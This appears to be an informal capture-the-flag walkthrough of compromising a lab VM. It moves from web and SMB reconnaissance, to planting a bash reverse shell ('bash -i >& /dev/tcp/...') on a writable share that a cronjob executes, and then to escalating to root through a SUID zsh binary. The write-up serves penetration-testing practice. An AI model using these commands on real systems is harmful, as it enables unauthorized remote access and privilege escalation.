Let's start with 80 for reconaissance
	dirb http://192.168.56.119/
	nikto -h 192.168.56.119
Checking the site intially don't find much interesting
	dirb finds /logs, lets go look at 192.168.56.119/logs
	Couple different logs but restricted to them except the management logs

Management log reveals a cronjob running 'web-control' and 'product-control' in the ITDEPT share

Let's look at the smb shares now

smbclient -L 192.168.56.119
	This reveals the ITDEPT share
smbclient //192.168.56.119/ITDEPT

Ok so now we are in the ITDEPT share but we don't see a web-control or product-control file, but we can create one and put it on the share, and when it runs we can force it to generate a reverse shell for us.

Back on our attacking machine, let's make the shell:

nano web-control

#!/bin/bash

bash -i >& /dev/tcp/192.168.56.125/4444 0>&1



Now let's go back to our tab in the smb share
put web-control
Now our reverse shell is on the server and should run on the cronjob, let's start a listener and wait
On our machine: nc -lvp 4444
Boom shell ez

first things first let's see if python is installed

python --version
bingo, let's generate a tty

python -c 'import pty; pty.spawn("/bin/bash")'

Great now we have a workable shell. Initial enuration around the file directories don't show much interesting info, let's see if any files have root permissions

cd to to the top

find / -user root -perm -4000 2>/dev/null

	One that sticks out is /usr/bin/zsh

cd /usr/bin

strings zsh
	Looks like an sh terminal...let's try to run it and see what happens

zsh

boom a new terminal.
whoami
root
gg
ez

cd /root
cat flag.txt
